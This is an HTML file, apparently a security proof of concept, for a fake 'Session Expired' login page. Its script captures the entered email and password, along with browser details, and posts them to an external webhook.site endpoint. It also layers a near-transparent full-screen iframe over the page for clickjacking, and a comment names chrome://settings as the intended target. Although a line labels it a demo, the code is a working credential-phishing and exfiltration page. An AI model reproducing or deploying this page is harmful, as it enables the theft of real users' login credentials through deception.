<!DOCTYPE html>
<html>
<head>
    <title>Login Required</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background: #f0f0f0;
        }
        .container {
            max-width: 400px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            border: 1px solid #ccc;
        }
        h2 {
            margin-top: 0;
            color: #333;
        }
        input {
            width: 100%;
            padding: 8px;
            margin: 8px 0;
            border: 1px solid #ddd;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
            margin-top: 10px;
        }
        .note {
            font-size: 12px;
            color: #666;
            margin-top: 20px;
        }
        iframe {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            opacity: 0.01;
            z-index: 9999;
            pointer-events: auto;
        }
        .status {
            margin-top: 20px;
            padding: 10px;
            background: #e8f5e9;
            display: none;
            word-break: break-all;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Session Expired</h2>
        <p>Please login again to continue</p>
        
        <form id="loginForm" action="https://webhook.site/29f60501-ccf6-4f66-9ba8-fee857e1754c" method="POST">
            <input type="email" name="email" placeholder="Email" value="test@example.com">
            <input type="password" name="password" placeholder="Password" value="password123">
            <button type="submit" id="submitBtn">Login</button>
        </form>
        
        <div class="note">
            ⚠️ This is a demo - credentials will be sent to webhook
        </div>
        
        <div class="status" id="status">
            ✓ Data sent to webhook: https://webhook.site/29f60501-ccf6-4f66-9ba8-fee857e1754c
        </div>
    </div>

    <!-- Clickjacking iframe target - using a dummy page since we can't load chrome://settings directly -->
    <iframe src="about:blank" id="clickjackFrame"></iframe>

    <script>
        // Function to capture form data and send to webhook
        function captureAndSend() {
            const email = document.querySelector('input[name="email"]').value;
            const password = document.querySelector('input[name="password"]').value;
            
            // Send to webhook
            fetch('https://webhook.site/29f60501-ccf6-4f66-9ba8-fee857e1754c', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    timestamp: new Date().toISOString(),
                    type: 'autofill_capture',
                    email: email,
                    password: password,
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    url: window.location.href
                })
            })
            .then(response => {
                document.getElementById('status').style.display = 'block';
                console.log('Data sent to webhook');
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Data captured but failed to send to webhook');
            });
        }

        // Simulate clickjacking by intercepting the button click
        document.getElementById('submitBtn').addEventListener('click', function(e) {
            e.preventDefault(); // Prevent actual form submission
            captureAndSend();
            
            // In a real clickjacking scenario, this would be triggered by the user clicking through a transparent iframe
            console.log('Clickjacking simulation: User clicked through transparent iframe');
            
            // Optional: Redirect to legitimate site after capture
            // window.location.href = 'https://google.com';
        });

        // Also capture when form is submitted via Enter key
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            captureAndSend();
        });

        // Auto-submit after 3 seconds to simulate autofill (for testing)
        setTimeout(() => {
            console.log('Auto-trigger for testing - remove in production');
            // Uncomment for testing:
            // captureAndSend();
        }, 3000);

        // Log for debugging
        console.log('PoC ready - Webhook target: https://webhook.site/29f60501-ccf6-4f66-9ba8-fee857e1754c');
    </script>
</body>
</html>
